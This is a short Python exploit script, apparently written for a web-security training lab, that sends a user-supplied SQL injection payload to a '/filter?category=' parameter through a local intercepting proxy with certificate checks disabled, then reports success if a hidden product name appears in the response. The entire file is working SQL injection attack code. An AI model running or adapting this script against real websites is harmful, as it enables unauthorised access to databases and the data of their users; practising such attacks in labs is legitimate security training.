import requests
import sys
import urllib3

urllib3.disable_warnings()

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def exploit_sqli(url, payload):
    uri = '/filter?category='
    response = requests.get(url + uri + payload, verify=False, proxies=proxies)

    if "Baby Minding Shoes" in response.text:
        return True
    else:
        return False

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        payload = sys.argv[2].strip()
    except IndexError:
        # print("[-] Usage: %s <url> <payload>" % sys.argv[0])
        print(f"[-] Usage: {sys.argv[0]} <url> <payload>")
        print(f'[-] Example: {sys.argv[0]} www.example.com "1=1"')
        sys.exit(-1)
    
    if exploit_sqli(url, payload):
        print("[+] SQL Injection successful!")
    else:
        print("[-] SQL Injection unsuccessful!")
